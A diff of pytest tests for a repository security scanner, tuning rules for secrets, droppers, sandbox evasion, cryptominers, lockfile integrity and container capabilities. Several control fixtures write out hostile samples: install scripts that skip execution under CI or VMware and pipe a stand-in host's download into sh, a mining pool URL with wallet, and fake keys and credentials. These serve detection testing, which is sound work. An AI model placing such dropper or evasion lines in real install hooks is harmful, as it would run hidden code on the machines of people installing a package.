@@ -8,6 +8,8 @@ Python codebase, and a repository somebody had made deep.
 
 from __future__ import annotations
 
+from typing import ClassVar
+
 import pytest
 
 from cordon_scanner import Scanner
@@ -2891,9 +2893,12 @@ class TestADeclarationAssignsNothing:
             (
                 "final class Analytics {\n"
                 "    private var observer: NSObjectProtocol?\n"
-                "    private let apiKey = "
-                + repr(assemble("phc_Kq3Wd7Rt9Zx2Vb5Nm8J", "f4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z"))
-                + "\n}\n"
+                # The PikPak OAuth client secret `AlistGo/alist` commits, rather than
+                # the PostHog key this used to carry: a PostHog PROJECT key is published
+                # on purpose and is now exempt at the finding site, so as a control it
+                # asserted nothing. This one carries no provider prefix, which is what
+                # keeps the assertion on the GENERIC rule rather than a provider's.
+                "    private let apiKey = " + repr(assemble("dbw2OtmVEe", "uUvIptb1Coyg")) + "\n}\n"
             ).encode()
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
@@ -5021,3 +5026,727 @@ class TestAnOverrideBesideArabicIsDoingItsJob:
         hits = self._bidi(tmp_path)
         assert [f for f in hits if f.severity >= Severity.HIGH]
         assert all("defeats review" in f.message for f in hits)
+
+
+class TestAPackageInsideAnotherPackagesTarball:
+    """`POLICY.LOCKFILE.INTEGRITY.001` fired in 31 of the 1,427 corpus repositories, and
+    roughly half of those were one npm behaviour: a package that declares
+    `bundleDependencies` ships its dependencies inside its own archive, and npm records
+    them at a nested path with a version and nothing else -- no `resolved`, no
+    `integrity`, not even the `license` it copies from a tarball it actually read.
+
+    There is no separate download to hash. The bytes are inside the parent's tarball,
+    which IS hashed, so the parent's hash covers them. `astral-sh/ruff` carries sixteen
+    under `@tailwindcss/oxide-wasm32-wasi/node_modules/` and `iamkun/dayjs` two hundred
+    and eight.
+
+    The other half stays reported, and the difference is structural rather than a matter
+    of degree: a TOP-LEVEL entry with no hash has no parent to be covered by.
+    """
+
+    @staticmethod
+    def _lock(packages: dict) -> str:
+        import json
+
+        return json.dumps({"name": "p", "lockfileVersion": 3, "packages": packages})
+
+    HASHED: ClassVar[dict] = {
+        "": {"name": "p", "version": "1.0.0"},
+        # The REAL registry host, not a `.test` one. `is_registry_host` is what
+        # decides whether an entry is a candidate at all, so a made-up host would
+        # excuse every line of these fixtures for the wrong reason and the controls
+        # would pass on nothing.
+        "node_modules/parent": {
+            "version": "4.1.0",
+            "resolved": "https://registry.npmjs.org/parent/-/parent-4.1.0.tgz",
+            "integrity": "sha512-" + "A" * 86 + "==",
+            "dev": True,
+        },
+    }
+
+    def _integrity(self, tmp_path, packages):
+        (tmp_path / "package-lock.json").write_text(self._lock(packages))
+        (tmp_path / "package.json").write_text('{"name": "p", "version": "1.0.0"}')
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001"
+        ]
+
+    def test_a_bundled_dependency_is_covered_by_its_parent(self, tmp_path) -> None:
+        packages = dict(self.HASHED)
+        for name in ("core", "runtime", "wasi-threads"):
+            packages[f"node_modules/parent/node_modules/@emnapi/{name}"] = {
+                "version": "1.11.1",
+                "dev": True,
+            }
+        assert self._integrity(tmp_path, packages) == []
+
+    def test_a_top_level_entry_with_no_hash_is_still_reported(self, tmp_path) -> None:
+        """The control. `h5bp/html5-boilerplate` has ninety of these and nothing covers
+        them: npm resolves the version from whatever registry is configured and verifies
+        nothing."""
+        packages = dict(self.HASHED)
+        packages["node_modules/ansi-regex"] = {"version": "5.0.1", "dev": True}
+        assert self._integrity(tmp_path, packages)
+
+    def test_a_nested_entry_that_was_fetched_is_still_reported(self, tmp_path) -> None:
+        """And the second control, which is why nesting alone cannot be the test: npm
+        nests a package whenever two versions of it are needed, and those are fetched
+        and hashed like any other. An entry carrying a `resolved` was downloaded."""
+        packages = dict(self.HASHED)
+        packages["node_modules/parent/node_modules/ansi-regex"] = {
+            "version": "3.0.0",
+            "resolved": "https://registry.npmjs.org/ansi-regex/-/ansi-regex-3.0.0.tgz",
+            "dev": True,
+        }
+        assert self._integrity(tmp_path, packages)
+
+    def test_an_unhashed_parent_cannot_cover_anything(self, tmp_path) -> None:
+        """The condition that makes this safe rather than convenient: without it the
+        rule would excuse a whole unhashed subtree on the strength of its shape."""
+        packages = {
+            "": {"name": "p", "version": "1.0.0"},
+            "node_modules/parent": {"version": "4.1.0", "dev": True},
+            "node_modules/parent/node_modules/child": {"version": "1.0.0", "dev": True},
+            "node_modules/hashed": {
+                "version": "2.0.0",
+                "resolved": "https://registry.npmjs.org/hashed/-/hashed-2.0.0.tgz",
+                "integrity": "sha512-" + "B" * 86 + "==",
+                "dev": True,
+            },
+        }
+        findings = self._integrity(tmp_path, packages)
+        assert findings
+        assert "2 of 3" in findings[0].message
+
+
+class TestReadingAnEnvironmentVariableIsNotEvasion:
+    """`SUSPECT.ANTI_ANALYSIS.001` fired at HIGH in twelve corpus repositories that
+    carried four findings or fewer, and the evidence in five of them was
+    `process.env.CI` -- the single most common environment lookup in the JavaScript
+    ecosystem. It decides whether to print a progress bar, use colour, open a watcher or
+    prompt, and Playwright's user-agent builder, zx, tailwindcss's integration
+    harness, mermaid's build script and next.js all read it for exactly that.
+
+    The rule had already made this decision twice: `os.geteuid() == 0` was removed
+    because every installer writes it, and `is_docker()` was never admitted because that
+    is how software sizes a thread pool. The hostname and username patterns have always
+    required a comparison. The environment reads required nothing.
+
+    The other half was a tool's NAME. `Bash-it/bash-it` ships a shell completion for
+    `dmidecode`, which mentions it six times and probes nothing, and `CISOfy/lynis` is a
+    security auditor that keeps `vmtoolsd` in its list of binaries to look for.
+    """
+
+    def _anti(self, tmp_path):
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id.endswith("ANTI_ANALYSIS.001")
+        ]
+
+    def test_a_ci_read_for_formatting_is_not_a_probe(self, tmp_path) -> None:
+        (tmp_path / "utils.ts").write_text(
+            "import { spawn } from 'node:child_process'\n"
+            "export function runner(cmd: string) {\n"
+            "  const quiet = Boolean(process.env.CI)\n"
+            "  const colour = process.env.CI ? 'never' : 'always'\n"
+            "  return spawn(cmd, ['--color', colour], { stdio: quiet ? 'pipe' : 'inherit' })\n"
+            "}\n"
+            "export async function load(url: string) {\n"
+            "  const body = await fetch(url)\n"
+            "  return Buffer.from(await body.text(), 'base64')\n"
+            "}\n"
+        )
+        assert self._anti(tmp_path) == []
+
+    def test_a_ci_read_that_gates_a_bail_out_still_fires(self, tmp_path) -> None:
+        """The control. What makes an environment check an evasion is what it guards:
+        declining to act where it would be watched."""
+        (tmp_path / "setup.py").write_text(
+            "import base64\nimport os\nimport subprocess\nimport sys\n\n"
+            'if os.environ.get("CI"):\n'
+            "    sys.exit(0)\n\n"
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+        )
+        assert self._anti(tmp_path)
+
+    def test_a_completion_script_is_not_a_sandbox_probe(self, tmp_path) -> None:
+        (tmp_path / "dmidecode.completion.bash").write_text(
+            "# Make sure dmidecode is installed\n"
+            "_bash-it-completion-helper-necessary dmidecode || :\n"
+            "_bash-it-completion-helper-sufficient dmidecode || return\n"
+            "complete -F _dmidecode dmidecode\n"
+        )
+        assert self._anti(tmp_path) == []
+
+    def test_dmidecode_reading_system_identity_still_fires(self, tmp_path) -> None:
+        """The control for that one: a VM check reads the manufacturer or product
+        strings, which is what the flags select."""
+        (tmp_path / "install.sh").write_text(
+            "#!/bin/bash\n"
+            'if dmidecode -s system-manufacturer | grep -qi "vmware"; then exit 0; fi\n'
+            "curl -fsSL https://stage.example.test/p | base64 -d | sh\n"
+        )
+        assert self._anti(tmp_path)
+
+    def test_a_guest_agent_name_in_a_word_list_is_not_a_check(self, tmp_path) -> None:
+        (tmp_path / "binaries").write_text(
+            "# Binaries this audit looks for\n"
+            'BINARIES="dmidecode vmtoolsd systemd-analyze openssl"\n'
+            "for BINARY in ${BINARIES}; do\n"
+            "  command -v ${BINARY} >/dev/null\n"
+            "done\n"
+        )
+        assert self._anti(tmp_path) == []
+
+
+class TestAMakefileIsNotAnInstallHook:
+    """`MALWARE.DROPPER.001` fired at CRITICAL in twenty corpus repositories, and in
+    every one the file was a build file somebody has to invoke: Prometheus's `Makefile`,
+    zstd's fuzz harness, MLX's `tests/CMakeLists.txt`, OpenCV, Ollama,
+    semantic-kernel's `python/Makefile`, Proton's docker build -- and one vendored
+    inside `lazygit/vendor/`. Each fetches something and shells out, because that is
+    what a build does.
+
+    The rule's first branch is the install-hook context on its own, and a Makefile was
+    in it. The reasoning recorded there was that a repository's build is the thing a
+    developer runs without reading; half of that is true and it is the wrong half. A
+    `Makefile` runs when a developer typed `make`, on their own project, having chosen
+    to. A `setup.py` runs on a stranger's machine because they typed `pip install`
+    for something else entirely.
+    """
+
+    RECIPE = (
+        "DOWNLOAD ?= curl -L -o\n"
+        "UNAME := $(shell sh -c 'uname -s')\n\n"
+        "tools:\n"
+        "\t$(DOWNLOAD) tool.tar.gz https://example.test/tool.tar.gz\n"
+        "\ttar -xzf tool.tar.gz && ./tool --version\n"
+    )
+
+    def test_a_makefile_that_downloads_a_tool_is_not_critical(self, tmp_path) -> None:
+        (tmp_path / "Makefile").write_text(self.RECIPE)
+        assert [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"
+        ] == []
+
+    def test_the_same_commands_in_setup_py_still_are(self, tmp_path) -> None:
+        """The control, and the distinction the whole change rests on: `pip install`
+        executes this, for somebody who asked for a different package."""
+        (tmp_path / "setup.py").write_text(
+            "import subprocess\n"
+            "from setuptools import setup\n\n"
+            'subprocess.run("curl -fsSL https://example.test/s.sh | sh", shell=True)\n'
+            'setup(name="p", version="1.0.0")\n'
+        )
+        assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"]
+
+    def test_a_makefile_is_still_inventoried_as_a_build_hook(self, tmp_path) -> None:
+        """Not silence: the file is still identified as one that executes commands. What
+        changed is the claim that nobody asked for it."""
+        (tmp_path / "Makefile").write_text(self.RECIPE)
+        hooks = Scanner().scan(tmp_path).repository.hooks
+        assert [h for h in hooks if h.name == "Makefile" and h.kind == "projectbuild"]
+
+
+class TestAVersionInAVariableIsStillAPin:
+    """`SUSPECT.CI.FETCH_EXEC.001`'s mitigation already excused a download from a
+    `/releases/download/<tag>/` path, because what runs is then decided before the build.
+    `FuelLabs/fuels-rs` downloads exactly that and was reported at HIGH anyway: its tag
+    is written `v${{ env.FORC_VERSION }}`, a GitHub Actions expression has spaces inside
+    its braces, and the mitigation's path segment refused whitespace.
+
+    The version is pinned. It is pinned one line further up, in `env`.
+    """
+
+    def _ci(self, tmp_path, body: str):
+        workflows = tmp_path / ".github" / "workflows"
+        workflows.mkdir(parents=True)
+        (workflows / "ci.yml").write_text(body)
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
+        ]
+
+    PINNED = (
+        "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
+        "    env:\n      FORC_VERSION: 0.66.5\n    steps:\n"
+        "      - run: |\n"
+        "          curl -sSLf https://example.test/sway/releases/download/"
+        "v${{ env.FORC_VERSION }}/forc.tar.gz -L -o forc.tar.gz\n"
+        "          tar -xvf forc.tar.gz\n"
+        "          chmod +x forc-binaries/forc\n"
+    )
+
+    UNPINNED = (
+        "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: |\n"
+        "          wget -cq -O butler.zip https://example.test/butler/LATEST/archive/default\n"
+        "          unzip butler.zip\n"
+        "          chmod +x butler\n"
+        "          ./butler -V\n"
+    )
+
+    def test_a_tag_written_as_an_expression_does_not_block(self, tmp_path) -> None:
+        hits = self._ci(tmp_path, self.PINNED)
+        assert hits, "the download is still reported, one step down"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    def test_latest_is_not_a_version(self, tmp_path) -> None:
+        """The control. `LATEST` in a path is the absence of a pin spelled out, and the
+        binary is executed in the same step."""
+        assert [f for f in self._ci(tmp_path, self.UNPINNED) if f.severity >= Severity.HIGH]
+
+
+class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
+    """`SECRET.GENERIC.ASSIGNMENT.001` was the widest single rule left: 57 of the corpus
+    repositories that carried three findings or fewer had at least one. Four shapes
+    covered a third of them.
+    """
+
+    def _hits(self, tmp_path):
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+
+    def test_a_comma_separated_list_is_a_list(self, tmp_path) -> None:
+        """`cherry-studio` declares `defaultByPassRules = 'localhost,127.0.0.1,::1'`, a
+        proxy bypass list whose name contains "pass" because it contains "byPass". No
+        credential format contains a comma: base64's alphabet has none, base62 and hex
+        have no punctuation at all, and a connection string separates with semicolons."""
+        (tmp_path / "settings.ts").write_text(
+            "const defaultByPassRules = 'localhost,127.0.0.1,::1'\n"
+        )
+        assert self._hits(tmp_path) == []
+
+    def test_a_ruby_symbol_is_a_name(self, tmp_path) -> None:
+        """RuboCop names the parser's token types: `COMPLEX_STRING_BEGIN_TOKEN =
+        :tSTRING_BEG`. Every cop that matches on token types has a few."""
+        (tmp_path / "cop.rb").write_text(
+            "module RuboCop\n"
+            "  COMPLEX_STRING_BEGIN_TOKEN = :tSTRING_BEG\n"
+            "  COMPLEX_STRING_END_TOKEN = :tSTRING_END\n"
+            "end\n"
+        )
+        assert self._hits(tmp_path) == []
+
+    def test_a_css_custom_property_ends_in_a_colon(self, tmp_path) -> None:
+        """`shadcn-ui/ui` writes `supportToken: "--font-heading:"`. The trailing colon
+        already said this was the name of a field; the leading dashes were what the
+        pattern could not get past."""
+        (tmp_path / "transform-font.ts").write_text(
+            'const config = {\n    supportToken: "--font-heading:",\n}\n'
+        )
+        assert self._hits(tmp_path) == []
+
+    def test_a_posthog_project_key_is_published_on_purpose(self, tmp_path) -> None:
+        """A PostHog PROJECT key is write-only ingestion and PostHog's own documentation
+        says to put it in client-side code. `browser-use`, `Fission-AI/OpenSpec` and
+        `hoppscotch` each commit one in their telemetry module, and a finding about it
+        has nothing to rotate and nothing to remove."""
+        (tmp_path / "telemetry.py").write_text(
+            "POSTHOG_PROJECT_API_KEY = 'phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X'\n"
+        )
+        assert self._hits(tmp_path) == []
+
+    def test_the_patterns_still_refuse_to_launder_a_prefix(self) -> None:
+        """Where that exemption is NOT: `NOT_A_SECRET` still has to refuse a prefixed
+        value, because that refusal is what stops `"glpat-" + "AAAA..."` reading as a
+        two-segment identifier. The exemption is a statement about one prefix at the
+        finding site, not a hole in the shape patterns."""
+        from cordon_scanner.detect.secrets import PLACEHOLDER
+
+        value = b"phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X"
+        assert NOT_A_SECRET.match(value) is None
+        assert PLACEHOLDER.search(value) is None
+
+    def test_a_personal_posthog_key_is_not_exempt(self, tmp_path) -> None:
+        """The control, and the reason the prefix is spelled out rather than the vendor:
+        `phx_` is PostHog's PERSONAL api key and it reads and writes everything."""
+        (tmp_path / "settings.py").write_text(
+            "POSTHOG_PERSONAL_API_KEY = 'phx_REDACTEDnotarealkey'\n"
+        )
+        assert self._hits(tmp_path)
+
+
+class TestThreeWaysToTypeAValueYouDidNotHave:
+    def test_a_marker_string_wears_its_underscores(self, tmp_path) -> None:
+        """V8's fuzzer declares `SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'`.
+        The identifier branch allowed two leading underscores and a marker uses as many
+        as it takes to be unmistakable."""
+        (tmp_path / "v8_suppressions.py").write_text(
+            "SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'\n"
+        )
+        assert not [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+
+    def test_the_words_run_together(self, tmp_path) -> None:
+        """`immich` seeds a test account with `password: 'thisIsAPassword123'`. The
+        placeholder vocabulary already covered `my_password_1`; this is the same sentence
+        with the separators left out, which is how it gets typed."""
+        (tmp_path / "seed.ts").write_text(
+            "export const admin = {\n  email: 'a@example.test',\n"
+            "  password: 'thisIsAPassword123',\n}\n"
+        )
+        assert not [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+
+    def test_a_run_of_digits(self, tmp_path) -> None:
+        """Fastlane documents `sonar_token: "123456abcdef"`. Six consecutive digits
+        inside real base64 key material is about one chance in a billion."""
+        (tmp_path / "sonar.rb").write_text('  options = {\n    sonar_token: "123456abcdef",\n  }\n')
+        assert not [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            b"glpat-AAAAAAAAAAAAAAAA",
+            b"dbw2OtmVEeuUvIptb1Coyg",
+            b"hunter2Sup3rSecretV",
+            b"SW2YcwTIb9zpOOhoPsMm",
+            b"xKc9vB2mQ7wRtY4u",
+        ],
+    )
+    def test_none_of_the_three_launders_key_material(self, value: bytes) -> None:
+        """The guard every widening in this file has to pass. The placeholder vocabulary
+        above is a closed list of English words run together; the underscore change only
+        moved a bound on padding."""
+        from cordon_scanner.detect.secrets import PLACEHOLDER
+
+        assert NOT_A_SECRET.match(value) is None
+        assert PLACEHOLDER.search(value) is None
+
+
+class TestAPayoutAddressIsNotAMiner:
+    """`SUSPECT.CRYPTOMINER.001` says, in its own message, that the file "references a
+    mining pool protocol, a pool host or a miner binary". Its match was `capability:
+    mine` alone, and a bare wallet address carried that capability -- so a donation
+    button satisfied the most alarming title in the tool at HIGH.
+
+    `ScreenToGif`'s `DonateSettings.xaml`, SmartTube's `donations.xml` and
+    `bitcoin/bitcoin`'s own source were each reported that way. The rule already carried
+    a path exclusion for `FUNDING.json`, which was this distinction showing through one
+    filename at a time.
+    """
+
+    DONATION = (
+        "<UserControl>\n"
+        '    <TextBlock Text="bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"'
+        ' ToolTip="Bitcoin"/>\n'
+        "</UserControl>\n"
+    )
+
+    def _mining(self, path):
+        return [f for f in Scanner().scan(path).findings if "CRYPTOMINER" in f.rule_id]
+
+    def test_a_donation_address_is_not_mining(self, tmp_path) -> None:
+        (tmp_path / "DonateSettings.xaml").write_text(self.DONATION)
+        assert self._mining(tmp_path) == []
+
+    def test_a_pool_protocol_still_is(self, tmp_path) -> None:
+        """The control. Stratum exists for mining and nothing else, which is what the
+        rule's message has always claimed to be about."""
+        (tmp_path / "miner.py").write_text(
+            'POOL = "stratum+tcp://pool.minexmr.invalid:4444"\n'
+            'WALLET = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
+            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
+        )
+        assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
+
+    def test_an_address_in_an_install_hook_still_is(self, tmp_path) -> None:
+        """And the second control, which is the one place a bare address keeps its
+        weight: nothing legitimate puts a payout address in code that runs on somebody
+        else's machine without being asked."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n\n"
+            'PAYOUT = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
+            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
+            'setup(name="p", version="1.0.0")\n'
+        )
+        assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
+
+
+class TestAKeyTheVendorGeneratedForYouToShip:
+    """Google's own documentation says the Firebase API key in `google-services.json` is
+    not a secret: it identifies the project, access is controlled by security rules, and
+    every Android binary using Firebase carries it where `strings` can read it.
+
+    `SECRET.GOOGLE.API_KEY.001` reported it in eight corpus repositories -- including
+    Firebase's own `mock-google-services.json` -- at HIGH, with a remediation that says
+    to rotate it. There is nothing to rotate.
+    """
+
+    KEY = "AIzaSyB7xQ2mVt9Xb1NpLr4Ws8Dy3Fz6Hj0Cg5Aq"
+
+    def test_a_firebase_client_config_is_not_a_leak(self, tmp_path) -> None:
+        import json
+
+        app = tmp_path / "app"
+        app.mkdir()
+        (app / "google-services.json").write_text(
+            json.dumps(
+                {
+                    "project_info": {"project_id": "demo-app"},
+                    "client": [{"api_key": [{"current_key": self.KEY}]}],
+                }
+            )
+        )
+        assert not [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
+
+    def test_the_same_key_anywhere_else_is(self, tmp_path) -> None:
+        """The control, and why the exemption is scoped to those filenames: a Google
+        Cloud key with billing attached is written exactly the same way."""
+        (tmp_path / "config.py").write_text(f'GOOGLE_MAPS_KEY = "{self.KEY}"\n')
+        assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
+
+
+class TestThreeKeysThatAnnounceThemselves:
+    """`SECRET.PRIVATE_KEY.001` at CRITICAL on a key whose own filename says it is not
+    real. Caddy keeps two TLS keys in `caddytest/`, which `**/test/**` cannot see;
+    `nccgroup/sadcloud` ships `static/example.key.pem`, and `**/*.example.*` wanted
+    something before the dot; `arminc/terraform-ecs` ships `ecs_fake_private`.
+    """
+
+    BODY = (
+        "-----BEGIN RSA PRIVATE KEY-----\n"
+        + "\n".join(["MIIEogIBAAKCAQEEXAMPLEONLYnotareal1notareal2notareal3notareal456"] * 20)
+        + "\n-----END RSA PRIVATE KEY-----\n"
+    )
+
+    def _keys(self, path):
+        return [f for f in Scanner().scan(path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
+
+    def test_a_directory_whose_name_ends_in_test(self, tmp_path) -> None:
+        tree = tmp_path / "caddytest"
+        tree.mkdir()
+        (tree / "caddy.localhost.key").write_text(self.BODY)
+        hits = self._keys(tmp_path)
+        assert hits, "still reported"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    def test_a_filename_that_says_it_is_not_real(self, tmp_path) -> None:
+        # Different bodies, or the two files collapse into one finding by file hash and
+        # the test would pass on half of what it means to assert.
+        (tmp_path / "ecs_fake_private").write_text(self.BODY)
+        (tmp_path / "example.key.pem").write_text(self.BODY.replace("x7Qz", "p4Lm"))
+        hits = self._keys(tmp_path)
+        assert len(hits) == 2
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    def test_a_key_with_no_such_claim_still_blocks(self, tmp_path) -> None:
+        """The control."""
+        deploy = tmp_path / "deploy"
+        deploy.mkdir()
+        (deploy / "id_rsa").write_text(self.BODY)
+        assert [f for f in self._keys(tmp_path) if f.severity >= Severity.HIGH]
+
+    def test_the_vagrant_insecure_key_is_published_on_purpose(self, tmp_path) -> None:
+        """Shipped in every Vagrant base box since 2010, documented as insecure, and
+        replaced on first `vagrant up`. It is committed in `hashicorp/vagrant` itself and
+        in every repository that vendors a box or a harness built on one."""
+        keys = tmp_path / "keys"
+        keys.mkdir()
+        (keys / "vagrant").write_text(
+            "-----BEGIN RSA PRIVATE KEY-----\n"
+            "MIIEogIBAAKCAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzI\n"
+            + "\n".join(["w+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoP"] * 15)
+            + "\n-----END RSA PRIVATE KEY-----\n"
+        )
+        assert self._keys(tmp_path) == []
+
+
+class TestBeingAVpnIsNotAnEscape:
+    """`SUSPECT.K8S.CAPABILITIES.001`'s message names SYS_ADMIN, SYS_PTRACE and
+    SYS_MODULE and says adding one "is not hardening a container, it is opting out of
+    one". NET_ADMIN was in its pattern, and that is not true of NET_ADMIN: it configures
+    the container's own network namespace, which is what every VPN and every `tun`-based
+    tool exists to do. `openvpn-install`, `dockur/windows`, `winapps` and three more were
+    reported at HIGH for needing it.
+    """
+
+    COMPOSE = "services:\n  openvpn:\n    image: openvpn:latest\n    cap_add:\n      - NET_ADMIN\n"
+
+    def test_net_admin_does_not_block(self, tmp_path) -> None:
+        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE)
+        hits = [f for f in Scanner().scan(tmp_path).findings if "K8S" in f.rule_id]
+        assert hits, "still reported"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    def test_sys_admin_still_does(self, tmp_path) -> None:
+        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE.replace("NET_ADMIN", "SYS_ADMIN"))
+        assert [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.K8S.CAPABILITIES.001" and f.severity >= Severity.HIGH
+        ]
+
+
+class TestAHostWithNoDotInIt:
+    """`SECRET.URL.CREDENTIAL.001` already excused loopback and the RFC-reserved names.
+    SQLAlchemy's `setup.cfg` declares one connection URL per driver and half of them
+    point at `mssql2022` -- the name of the container its own test suite starts -- with
+    `scott:tiger`, Oracle's demonstration account since 1979. The loopback variants in
+    the same file were excused and these were not.
+
+    A single-label host does not resolve on the public internet. It is a Compose service,
+    a Kubernetes service or an `/etc/hosts` entry: reachable only from inside the thing
+    that defines it.
+    """
+
+    def _urls(self, tmp_path):
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.URL.CREDENTIAL.001"
+        ]
+
+    def test_a_compose_service_name_is_not_a_host(self, tmp_path) -> None:
+        (tmp_path / "setup.cfg").write_text(
+            "[db]\n"
+            "mssql = mssql+pyodbc://scott:tiger^5HHH@mssql2022:1433/test?driver=ODBC\n"
+            "pymssql = mssql+pymssql://scott:tiger^5HHH@mssql2022:1433/test\n"
+        )
+        assert self._urls(tmp_path) == []
+
+    def test_a_qualified_host_still_is(self, tmp_path) -> None:
+        """The control, and the reason private ranges were never added to this list: a
+        credential for something that resolves is a credential for something real."""
+        (tmp_path / "config.py").write_text(
+            'DSN = "postgres://admin:Xk9mQ2vB7wRtY4uZ@db.prod.internal-corp.net:5432/app"\n'
+        )
+        assert [f for f in self._urls(tmp_path) if f.severity >= Severity.HIGH]
+
+    def test_a_uri_grammar_is_not_a_url(self, tmp_path) -> None:
+        """Postgres documents the syntax its own parser accepts, in a comment, in
+        brackets. A bracket is not in base64's alphabet any more than a parenthesis is."""
+        (tmp_path / "fe-connect.c").write_text(
+            "/*\n * postgresql://[user[:password]@][netloc][:port][/dbname][?param1=value1]\n */\n"
+        )
+        assert self._urls(tmp_path) == []
+
+    def test_a_file_called_test_is_test_material(self, tmp_path) -> None:
+        """VLC's url-parser tests live in `share/lua/intf/test.lua` and pass a URL with
+        credentials in it, because testing a url parser requires one."""
+        tree = tmp_path / "share" / "lua" / "intf"
+        tree.mkdir(parents=True)
+        (tree / "test.lua").write_text(
+            "assert_url(vlc.strings.url_parse('sftp://userbla:Passw0rd@server.org/x'),\n"
+            "           'sftp', 'userbla', 'Passw0rd', 'server.org', 0, '/x')\n"
+        )
+        hits = self._urls(tmp_path)
+        assert hits, "still reported"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+
+class TestAProjectNamesItsOwnTestTree:
+    """A project spells its test tree with its own name in front, and `**/test/**` sees
+    none of it: Caddy keeps two TLS keys in `caddytest/`, Radarr and Sonarr keep an HTML
+    file named `.jpg` under `src/NzbDrone.Core.Test/Files/` to test mime handling, and
+    okio keeps a deliberately corrupt archive under `okio-testing-support/`.
+
+    `**/*test/**` was tried first and two existing tests refused it inside one run:
+    `docs/latest/` and `src/latest/` are not test trees. A glob cannot tell a compound
+    from a word that happens to end the same way, so the exceptions are named.
+    """
+
+    @pytest.mark.parametrize(
+        ("path", "expected"),
+        [
+            ("caddytest/caddy.localhost.key", True),
+            ("src/NzbDrone.Core.Test/Files/html_image.jpg", True),
+            ("okio-testing-support/src/resources/spanning.zip", True),
+            ("integration_tests/fixtures/key.pem", True),
+            ("docs/latest/guide.md", False),
+            ("src/latest/config.py", False),
+            ("contest/entry.py", False),
+            ("src/main.py", False),
+        ],
+    )
+    def test_which_directories_hold_test_material(self, path: str, expected: bool) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path) is expected
+
+
+class TestAWebpNamedPng:
+    """A build step or a designer converts an asset and keeps the old name, and WebP is
+    the format that happens to most: `odysseus`'s `static/icons/sglang-logo.png` and
+    `miru-app`'s `assets/icon/anilist.jpg` are both WebP. Neither was recognised at all,
+    so the mismatch check could not say they were images saved under the wrong name --
+    only that they were not PNG.
+    """
+
+    WEBP = b"RIFF$\xaa\x01\x00WEBPVP8X\n\x00\x00\x00" + b"\x00" * 64
+
+    def test_a_webp_under_an_image_name_is_a_naming_error(self, tmp_path) -> None:
+        icons = tmp_path / "static" / "icons"
+        icons.mkdir(parents=True)
+        (icons / "logo.png").write_bytes(self.WEBP)
+        (icons / "avatar.jpg").write_bytes(self.WEBP)
+        assert not [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
+        ]
+
+    def test_html_under_an_image_name_still_is(self, tmp_path) -> None:
+        """The control, and the reason only the image KINDS are interchangeable: a
+        document served as a picture is how a file-upload filter gets past."""
+        (tmp_path / "payload.jpg").write_bytes(
+            b"<html><body><h1>Direct</h1><script>fetch('/x')</script></body></html>\n"
+        )
+        assert [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
+        ]
+
+
+class TestAnUninstallerIsTheOppositeOfPersistence:
+    """`pi-hole`'s `automated install/uninstall.sh` runs
